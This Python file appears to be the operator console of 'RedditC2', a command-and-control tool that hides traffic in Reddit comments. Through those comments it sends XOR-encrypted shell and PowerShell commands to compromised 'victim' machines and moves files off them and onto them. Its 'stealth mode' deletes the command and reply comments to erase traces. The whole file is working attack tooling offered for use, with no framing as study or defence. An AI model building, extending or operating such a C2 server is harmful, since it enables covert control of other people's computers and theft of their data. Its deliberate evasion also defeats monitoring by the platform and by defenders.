import praw
import time
import os
import json
import platform
from prawcore import NotFound
from praw.models import InlineImage
from encryption import *
from banner import *
import autocomplete
import readline

comp = autocomplete.Completer()
# we want to treat '/' as part of a word, so override the delimiters
readline.set_completer_delims(' \t\n;')
readline.parse_and_bind("tab: complete")
readline.set_completer(comp.complete)

#define the host's OS
hostOS = platform.system()        

#Function to convert base64 to file
def base64_to_file(base64_string, filename):
    # decode the base64 string
    decoded_data = base64.b64decode(base64_string).decode('utf-8')
    # write the data to the file
    with open(filename, 'wb') as f:
        f.write(decoded_data.encode())

#Function to encode a file to base64
def encode_file_in_base64(filepath):
    with open(filepath, 'rb') as file:
        file_data = file.read()
    return base64.b64encode(file_data).decode('utf-8')

class TeamServer:

    def __init__(self, client_id, client_secret, username, password, user_agent, stealth_mode, xor_key):
        self.client_id = client_id
        self.client_secret = client_secret
        self.username = username
        self.password = password
        self.user_agent = user_agent
        self.stealth_mode = stealth_mode
        self.xor_key = xor_key
        self.subreddit_name = None
        self.listener_name = None
        self.submission = None
        self.comment_id = None
        self.__reddit = None
        self.__subreddit = None

    @property
    # creating an authorized reddit instance
    def reddit(self):
        if self.__reddit is None:
            self.__reddit = praw.Reddit(
                client_id = self.client_id,
                client_secret = self.client_secret,
                username = self.username,
                password = self.password,
                user_agent = self.user_agent
                )
            self.__reddit.validate_on_submit = True
        return self.__reddit

    @property
    def subreddit(self):
        if self.__subreddit is None:
            self.__subreddit = self.reddit.subreddit(self.subreddit_name)
        return self.__subreddit

    #list all listeners (all post titles in a specific Subreddit)
    def listListeners(self):
        # Print the titles of all posts
        for post in self.subreddit.hot(limit=None):
            print("[*] " + post.title)
        
    #post into the subreddit
    def createPost(self):
        postContent = "" #add a post content if you don't want to leave the post body empty
        #create a post
        self.subreddit.submit(self.listener_name, selftext=postContent)

    def verifySession(self):
        for submission in self.subreddit.top(time_filter='all'):
            if(submission.title == self.listener_name):
                self.submission = submission
        return self.submission
        
    def sub_exists(self):
        exists = True
        try:
            self.reddit.subreddits.search_by_name(self.subreddit_name, exact=True)
        except NotFound:
            exists = False
        return exists

    #read a post with a specific title
    def readOutput(self):
        victim_responses = []
        #get comment based on comment_id from last sent command
        comment = self.reddit.comment(self.comment_id)

        #wait for comment to get a reply
        replies = None
        while not victim_responses:
            time.sleep(5)
            comment.refresh()
            replies = comment.replies

            for reply in replies:        
                #look only for comments which have output to our command in it
                if('out:' in reply.body):
                    #now read the below comment, which is the output result and delete it if stealth mode is on               
                    victim_responses.append(reply.body)
                    if self.stealth_mode == "1":
                        reply.delete()

        response = victim_responses[0]
        response = response[7:]
        response = response[:-1]
        
        #decode and decrypt the message
        decipher = decrypt(str(response), self.xor_key)
        
        print("[+] Received Output:\n" + str(decipher))

        #delete original command comment if stealth_mode is on
        if self.stealth_mode == "1":
            comment.delete()

        return str(decipher)

    def sendCommand(self, command):
        command = self.submission.reply("in: " + command)
        self.comment_id = command.id
        

if __name__ == "__main__":
    #print the banner
    print(banner)
    
    #retrieve the data from the configuration file
    with open ("config.json", "r") as configFile:
        data = json.load(configFile)

    client_id = data['client_id']
    client_secret = data['client_secret']
    username = data['username']
    password = data['password']
    user_agent = data['user_agent']
    stealth_mode = data['stealth_mode']
    xor_key = data['xor_key']

    t = TeamServer(client_id, client_secret, username, password, user_agent, stealth_mode, xor_key)
    
    while True:
        command = input("RedditC2> ")
        if command[:13] == "set subreddit":
            #validate the subreddit
            t.subreddit_name = command[14:]
            if t.sub_exists():
                print("[*] Subreddit set to: " + command[14:])
            else:
                t.subreddit_name = None
                print("[-] The selected subreddit doesn't exist or doesn't have propper permissions. Try again with another subreddit.")

        #list all listeners the operator can use
        elif command[:14] == "list listeners":
            if t.subreddit_name is None:
                print("[!] Use the 'set subreddit' command first.")
            else:
                t.listListeners()

        #careful, only execute this once
        elif command[:15] == "create listener":
            listener_name = command[16:]
            if t.subreddit_name is None:
                print("[!] Use the 'set subreddit' command first.")
            else:
                t.listener_name = listener_name
                t.createPost()
                print("[+] Listener created")

        elif command[:12] == "use listener":
            if t.subreddit_name is None:
                print("[!] Use the 'set subreddit' command first.")
            else:
                t.listener_name = command[13:]
                listener_session = t.verifySession()
                if listener_session:
                    print("[+] Entered the session")

                    while True:
                        session_command = input(t.listener_name + "> ")

                        #------------------------ ALL AGENT FEATURES START HERE ------------------------
                        if(session_command == "exit"):
                            break

                        elif(session_command == "clear"):
                            if (hostOS == "Linux"):
                                os.system('clear')
                            elif (hostOS == "Windows"):
                                os.system('cls')
                        
                        elif session_command == '':
                            pass
                    
                        else:
                            if(session_command[:8] == "download"):
                                filename = session_command[9:] #save the file that user entered
                                
                            if(session_command[:6] == "upload"):
                                filename = session_command[7:] #save the file that user entered
                                session_command = "upload " + filename + " " + encode_file_in_base64(filename)
                                if(len(session_command) > 10000):
                                    print("[!] File is too large (" + str(len(session_command)) + "/10000 available characters)")
                                    break
                                else:
                                    print("[+] Uploading " + filename + " to the target")
                            
                            final_message = encrypt(session_command, xor_key)
                                          
                            #send the command
                            t.sendCommand(str(final_message))
                            print("[+] Command sent")
                            
                            if(session_command[:8] == "download"):
                                fileContent = t.readOutput()
                                if("File is too large" in fileContent):
                                    pass
                                else:
                                    base64_to_file(fileContent, "downloads/" + filename)
                                    print("[+] File saved as " + filename)
                                
                            else:
                                t.readOutput()
                        #------------------------ AGENT FEATURES END HERE ------------------------
                else:
                    print("[!] Could not enter the session")


        elif command == 'clear':
            if (hostOS == "Linux"):
                os.system('clear')
            elif (hostOS == "Windows"):
                os.system('cls')
            
        elif command == 'exit':
            print("[*] Exiting")
            exit()

        elif command == 'help':
            print("""
set subreddit [subreddit_name]   --> Select the subreddit where you will create the listener
list listeners                   --> List all listeners you can use within the subreddit
create listener [listener_name]  --> Create a post in subreddit where the traffic will ocurr
use listener [listener_name]     --> Interact With Each Session Individually
run [command]                    --> Execute a cmd command
download [file_name]             --> Download a file from the target
upload [file_name]               --> Upload a file to the target
powershell [command]             --> Execute a powershell command
help                             --> Show the help menu
exit                             --> Exit from the session
clear                            --> Clear the screen
                """)

        elif command == '':
            pass

        else:
            print("[-] Command Not Found")
